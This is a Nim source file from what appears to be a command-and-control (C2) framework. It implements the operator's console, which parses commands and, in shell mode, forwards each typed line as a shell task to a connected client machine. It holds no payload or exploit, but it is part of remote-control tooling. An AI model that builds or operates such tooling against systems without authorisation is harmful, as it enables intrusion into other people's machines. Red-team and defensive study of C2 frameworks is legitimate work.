import asyncdispatch, threadpool, asyncfutures, parseopt, tables
import strutils 

import types, logging

import ../clientTasks/shell
import commands/mainCommands/backCmd
import communication

proc procStdin*(server: C2Server) {.async.} =

  let c2cli = server.cli
  c2cli.initialized = true
  c2cli.interactive = true

  prompt(server)

  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      var input = ^messageFlowVar
      
      if "!!" in input:
        input = input.replace("!!", c2cli.lastCommand)
      
      let args = input.split(" ")
      let cmd = args[0]
      
      if c2cli.mode == ShellMode:
        if cmd == "back":
          c2cli.mode = ClientInteractMode
        else:
          let task = await shell.sendTask(server.cli.handlingClient, args.join(" "))
          await task.awaitResponse()
      else:
        for command in c2cli.commands:
          if command.name == cmd or cmd in command.aliases:
            c2cli.interactive = false
            if command.cliMode == @[ClientInteractMode] and c2cli.mode != ClientInteractMode:
              errorLog "you must interact with a client to use this command (see 'help interact')"
            elif command.requiresConnectedClient and not c2cli.handlingClient.connected:
              errorLog "you can't use this command on a disconnected client"
            else:
              var flags: Table[string, string] = initTable[string, string]()
              var parsedArgs: seq[string] = @[]

              var p = initOptParser(args[1..(len(args)-1)].join(" "))

              while true:
                p.next()
                case p.kind
                of cmdEnd: break
                of cmdShortOption, cmdLongOption:
                  flags[p.key] = p.val
                of cmdArgument:
                  parsedArgs.add(p.key)

              c2cli.lastCommand = input

              await command.execProc(
                cmd=command,
                originalCommand=input,
                flags=flags,
                args=parsedArgs,
                server=server
              )
            
            c2cli.interactive = true

      prompt(server)
      messageFlowVar = spawn stdin.readLine() 
      
    await asyncdispatch.sleepAsync(100)